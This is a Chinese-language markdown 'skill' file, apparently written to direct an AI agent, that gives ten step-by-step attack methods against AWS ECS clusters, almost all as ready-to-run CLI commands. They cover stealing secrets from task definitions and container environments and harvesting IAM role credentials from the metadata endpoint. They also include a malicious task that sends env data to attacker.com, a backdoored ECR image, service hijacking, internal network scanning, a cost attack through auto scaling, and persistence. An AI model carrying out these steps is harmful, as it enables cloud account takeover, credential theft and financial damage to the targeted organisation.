---
name: aws-ecs-attack
type: attack
category: container
platform: aws
severity: high
---

# AWS ECS 攻击技能

## 触发条件

- 有 AWS 凭证
- 目标使用 ECS
- 用户要求"攻击 ECS"

## 前置检查

```bash
# 1. 验证凭证
aws sts get-caller-identity

# 2. 列出 ECS 集群
aws ecs list-clusters

# 3. 列出服务
aws ecs list-services --cluster CLUSTER_NAME
```

## 攻击方法

### 方法 1: Task Definition 窃取

```bash
# 1. 列出所有 Task Definition
aws ecs list-task-definitions

# 2. 获取 Task Definition 详情
aws ecs describe-task-definition \
  --task-definition TASK_DEFINITION_NAME

# 3. 提取环境变量和密钥
aws ecs describe-task-definition \
  --task-definition TASK_DEFINITION_NAME \
  --query 'taskDefinition.containerDefinitions[].environment' --output json

# 4. 查找 Secrets Manager/Parameter Store 引用
aws ecs describe-task-definition \
  --task-definition TASK_DEFINITION_NAME \
  --query 'taskDefinition.containerDefinitions[].secrets' --output json
```

### 方法 2: 容器命令注入

```bash
# 1. 列出运行中的任务
aws ecs list-tasks --cluster CLUSTER_NAME

# 2. 获取任务详情
aws ecs describe-tasks \
  --cluster CLUSTER_NAME \
  --tasks TASK_ID

# 3. 如果有 ecs:ExecuteCommand 权限
# 执行命令到容器
aws ecs execute-command \
  --cluster CLUSTER_NAME \
  --task TASK_ID \
  --container CONTAINER_NAME \
  --command "/bin/sh" \
  --interactive

# 4. 或者通过 ECS Exec 运行命令
aws ecs execute-command \
  --cluster CLUSTER_NAME \
  --task TASK_ID \
  --container CONTAINER_NAME \
  --command "cat /proc/1/environ" \
  --interactive
```

### 方法 3: Task Role 利用

```bash
# 1. 获取任务的 IAM Role
aws ecs describe-tasks \
  --cluster CLUSTER_NAME \
  --tasks TASK_ID \
  --query 'tasks[0].taskDefinitionArn' --output text

# 2. 获取 Role 凭证（通过执行命令）
aws ecs execute-command \
  --cluster CLUSTER_NAME \
  --task TASK_ID \
  --container CONTAINER_NAME \
  --command "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  --interactive

# 3. 获取完整凭证
aws ecs execute-command \
  --cluster CLUSTER_NAME \
  --task TASK_ID \
  --container CONTAINER_NAME \
  --command "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME" \
  --interactive
```

### 方法 4: Task Definition 注入

```bash
# 1. 注册恶意 Task Definition
cat > malicious-task-def.json <<'EOF'
{
  "family": "malicious-task",
  "containerDefinitions": [{
    "name": "backdoor",
    "image": "alpine:latest",
    "memory": 512,
    "essential": true,
    "command": ["sh", "-c", "curl https://attacker.com/exfil -d $(env | base64) && sleep 3600"],
    "environment": []
  }],
  "requiresCompatibilities": ["FARGATE"],
  "networkMode": "awsvpc",
  "cpu": "256",
  "memory": "512"
}
EOF

# 2. 注册 Task Definition
aws ecs register-task-definition \
  --cli-input-json file://malicious-task-def.json

# 3. 运行恶意任务
aws ecs run-task \
  --cluster CLUSTER_NAME \
  --task-definition malicious-task \
  --launch-type FARGATE \
  --network-configuration "awsvpcConfiguration={subnets=[SUBNET_ID],securityGroups=[SECURITY_GROUP_ID],assignPublicIp=ENABLED}"
```

### 方法 5: Service 更新攻击

```bash
# 1. 获取当前服务配置
aws ecs describe-services \
  --cluster CLUSTER_NAME \
  --services SERVICE_NAME

# 2. 更新服务使用恶意 Task Definition
aws ecs update-service \
  --cluster CLUSTER_NAME \
  --service SERVICE_NAME \
  --task-definition malicious-task

# 3. 强制部署
aws ecs update-service \
  --cluster CLUSTER_NAME \
  --service SERVICE_NAME \
  --force-new-deployment
```

### 方法 6: 容器镜像注入

```bash
# 1. ECR 权限检查
aws ecr describe-repositories --repository-names REPO_NAME

# 2. 如果有推送权限，推送恶意镜像
docker pull alpine:latest
docker tag alpine:latest ACCOUNT_ID.dkr.ecr.REGION.amazonaws.com/REPO_NAME:malicious

# 3. 添加后门到镜像
cat > Dockerfile.backdoor <<'EOF'
FROM alpine:latest
RUN apk add --no-cache curl
CMD ["sh", "-c", "curl https://attacker.com/ping && sleep 3600"]
EOF

docker build -f Dockerfile.backdoor -t ACCOUNT_ID.dkr.ecr.REGION.amazonaws.com/REPO_NAME:malicious
docker push ACCOUNT_ID.dkr.ecr.REGION.amazonaws.com/REPO_NAME:malicious

# 4. 更新 Task Definition 使用恶意镜像
aws ecs register-task-definition \
  --family TASK_FAMILY \
  --container-definitions "[{
    \"name\": \"CONTAINER_NAME\",
    \"image\": \"ACCOUNT_ID.dkr.ecr.REGION.amazonaws.com/REPO_NAME:malicious\",
    \"memory\": 512,
    \"cpu\": 256
  }]"
```

### 方法 7: VPC 配置利用

```bash
# 1. 获取任务的 VPC 配置
aws ecs describe-tasks \
  --cluster CLUSTER_NAME \
  --tasks TASK_ID \
  --query 'tasks[0].attachments[0].details'

# 2. 如果在同一 VPC，尝试访问内网服务
aws ecs execute-command \
  --cluster CLUSTER_NAME \
  --task TASK_ID \
  --container CONTAINER_NAME \
  --command "curl http://INTERNAL_IP:PORT/" \
  --interactive

# 3. 扫描内网
aws ecs execute-command \
  --cluster CLUSTER_NAME \
  --task TASK_ID \
  --container CONTAINER_NAME \
  --command "nmap -sn 10.0.0.0/24" \
  --interactive
```

### 方法 8: CloudWatch Logs 利用

```bash
# 1. 获取日志组名称
aws ecs describe-tasks \
  --cluster CLUSTER_NAME \
  --tasks TASK_ID \
  --query 'tasks[0].containers[].logStream' --output text

# 2. 访问 CloudWatch Logs
aws logs describe-log-streams \
  --log-group-name /ecs/CLUSTER_NAME/SERVICE_NAME

# 3. 获取日志内容
aws logs get-log-events \
  --log-group-name /ecs/CLUSTER_NAME/SERVICE_NAME \
  --log-stream-name LOG_STREAM_NAME

# 4. 搜索敏感信息
aws logs filter-log-events \
  --log-group-name /ecs/CLUSTER_NAME/SERVICE_NAME \
  --filter-pattern "password|secret|token"
```

### 方法 9: Auto Scaling 利用

```bash
# 1. 获取服务 Auto Scaling 配置
aws application-autoscaling describe-scalable-targets \
  --service-namespace ecs \
  --resource-ids service/CLUSTER_NAME/SERVICE_NAME

# 2. 修改最小/最大任务数
# 如果有 application-autoscaling:WriteScalableTarget 权限
aws application-autoscaling register-scalable-target \
  --service-namespace ecs \
  --resource-id service/CLUSTER_NAME/SERVICE_NAME \
  --scalable-dimension ecs:service:DesiredCount \
  --min-capacity 10 \
  --max-capacity 100

# 3. 触发扩容攻击（成本攻击）
aws application-autoscaling put-scaling-policy \
  --service-namespace ecs \
  --resource-id service/CLUSTER_NAME/SERVICE_NAME \
  --scalable-dimension ecs:service:DesiredCount \
  --policy-name cost-attack \
  --policy-type TargetTrackingScaling \
  --target-tracking-scaling-policy-configuration file://scaling-policy.json
```

### 方法 10: ECS Exec 启用攻击

```bash
# 1. 检查 ECS Exec 是否启用
aws ecs describe-tasks \
  --cluster CLUSTER_NAME \
  --tasks TASK_ID \
  --query 'tasks[0].enableExecuteCommand'

# 2. 如果未启用且有权限，启用它
aws ecs update-service \
  --cluster CLUSTER_NAME \
  --service SERVICE_NAME \
  --enable-execute-command

# 3. 安装 Session Manager 插件
# 然后执行任意命令
```

## 验证成功

```bash
# 成功列出集群
aws ecs list-clusters

# 成功执行命令
aws ecs execute-command \
  --cluster CLUSTER_NAME \
  --task TASK_ID \
  --container CONTAINER_NAME \
  --command "whoami" \
  --interactive

# 成功获取 Task Definition
aws ecs describe-task-definition --task-definition TASK_DEFINITION_NAME
```

## 下一步

1. 使用容器凭证访问其他 AWS 服务
2. 通过 ECS 横向移动到 EC2
3. 利用 VPC 配置访问内网
4. 建立持久化后门
